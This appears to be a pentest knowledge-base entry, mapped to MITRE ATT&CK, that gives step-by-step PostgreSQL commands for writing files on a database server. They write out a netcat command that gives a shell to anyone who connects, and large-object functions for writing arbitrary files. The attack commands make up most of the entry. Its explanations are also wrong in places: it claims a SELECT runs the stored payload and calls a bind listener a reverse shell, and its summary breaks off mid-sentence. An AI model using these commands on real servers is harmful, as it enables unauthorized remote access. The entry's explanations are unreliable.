---
id: 502bafd6-f56d-4fbc-8386-f828fccd8d10
name: PostgreSQL File Write with Reverse Shell Payload
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:36.006659+00:00'
updated_at: '2023-04-10T20:23:17.619456+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[File Permissions Modification|T1222 - File Permissions Modification]]'
tags:
- '[[PostgreSQL File Write]]'
- '[[PostgreSQL injection]]'
commands:
- '[[Append Data to Large Object]]'
- '[[Copy command to file]]'
- '[[Copy pentestlab table to /tmp/pentestlab]]'
- '[[Create Large Object with OID]]'
- '[[Create pentestlab table]]'
- '[[Export Data from Large Object]]'
- '[[Insert command into pentestlab table]]'
- '[[Select from pentestlab table]]'
---

# PostgreSQL File Write with Reverse Shell Payload

## Summary

PostgreSQL File Write with Reverse Shell Payload is a technique used by attackers to write a file containing a reverse shell payload to a PostgreSQL database. This technique is used as part of a larger attack to gain access to a target network. Attackers can use this technique to execute arbitrary 

## Description

# Description

PostgreSQL File Write with Reverse Shell Payload is a technique used by attackers to write a file containing a reverse shell payload to a PostgreSQL database. This technique is used as part of a larger attack to gain access to a target network. Attackers can use this technique to execute arbitrary code on the target system, allowing them to gain a foothold in the network and move laterally to other systems.

This technique involves injecting malicious SQL code into a PostgreSQL database. The code is designed to create a new table with a large object field that contains the reverse shell payload. Once the table is created, the attacker can use a listener to connect to the target system and execute the payload, which will give them remote access to the system.

The business value of this attack is that it allows attackers to gain access to sensitive data and systems, which can be used for financial gain, industrial espionage, or other nefarious purposes.

## Requirements

1. Access to a vulnerable PostgreSQL database

1. Knowledge of SQL injection techniques

1. A listener to connect to the target system

## Defense

1. Use parameterized queries to prevent SQL injection attacks

1. Implement network segmentation to limit the impact of a successful attack

1. Monitor database activity for suspicious behavior

## Objectives

1. Write a file containing a reverse shell payload to a PostgreSQL database

1. Execute arbitrary code on the target system

1. Gain remote access to the target system

# Instructions

1. This command creates a table named 'pentestlab' with a single column 't' of type TEXT. It then inserts a reverse shell payload into the 't' column. When the SELECT * FROM pentestlab; command is executed, the reverse shell is triggered. Finally, the COPY command is used to copy the contents of the 't' column to a file named '/tmp/pentestlab'.

**Code**: [[CREATE TABLE pentestlab (t TEXT);
INSERT INTO pent]]

> The CREATE TABLE statement is used to create a new table in the database. In this case, the table is named 'pentestlab' and has a single column 't' of type TEXT. The INSERT INTO statement is used to insert a value into the 't' column. In this case, the value is a reverse shell payload that will execute when the SELECT * FROM pentestlab; command is run. The SELECT * FROM pentestlab; command is used to retrieve all rows from the 'pentestlab' table, which will trigger the execution of the reverse shell payload. Finally, the COPY command is used to copy the contents of the 't' column to a file named '/tmp/pentestlab'. This can be useful for persisting the payload or for transferring it to another system.

**Command** ([[Create pentestlab table]]):

```bash
CREATE TABLE pentestlab (t TEXT);
```

**Command** ([[Insert command into pentestlab table]]):

```bash
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
```

**Command** ([[Select from pentestlab table]]):

```bash
SELECT * FROM pentestlab;
```

**Command** ([[Copy pentestlab table to /tmp/pentestlab]]):

```bash
COPY pentestlab(t) TO '/tmp/pentestlab';
```

2. This command will create a reverse shell listener on the target machine. The listener will wait for incoming connections from the attacker's machine on port 2346. Once a connection is established, the attacker will have access to the target machine's shell.

**Code**: [[COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tm]]

> The 'nc' command is used to establish a network connection with another machine. The '-l' option specifies that the machine should listen for incoming connections, while the '-v' option enables verbose output. The '-p' option specifies the port number to listen on. The '-e' option specifies the command to execute once a connection is established, which in this case is '/bin/bash', giving the attacker access to the target machine's shell. The 'TO' clause specifies the file to write the output to, which in this case is '/tmp/pentestlab'.

**Command** ([[Copy command to file]]):

```bash
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
```

3. These commands are used to manipulate large objects in PostgreSQL. The first command creates a new large object with the specified OID and data. The second command appends data to an existing large object at the specified offset. The third command exports the data from an existing large object to a file at the specified path.

**Code**: [[SELECT lo_from_bytea(oid, 'your file data goes in ]]

> The 'lo_from_bytea' command takes two arguments: the OID of the large object to be created and the binary data to be stored in it. The 'lo_put' command takes three arguments: the OID of the large object to be modified, the offset at which to append the new data, and the binary data to be appended. The 'lo_export' command takes two arguments: the OID of the large object to be exported and the path of the file to which the data should be written.

**Command** ([[Create Large Object with OID]]):

```bash
SELECT lo_from_bytea(oid, 'your file data goes in here');
```

**Command** ([[Append Data to Large Object]]):

```bash
SELECT lo_put(oid, offset, 'some other data');
```

**Command** ([[Export Data from Large Object]]):

```bash
SELECT lo_export(oid, '/tmp/testexport');
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[File Permissions Modification|T1222 - File Permissions Modification]]

## Commands Used

- [[Append Data to Large Object]]
- [[Copy command to file]]
- [[Copy pentestlab table to /tmp/pentestlab]]
- [[Create Large Object with OID]]
- [[Create pentestlab table]]
- [[Export Data from Large Object]]
- [[Insert command into pentestlab table]]
- [[Select from pentestlab table]]

## Tags

- [[PostgreSQL File Write]]
- [[PostgreSQL injection]]
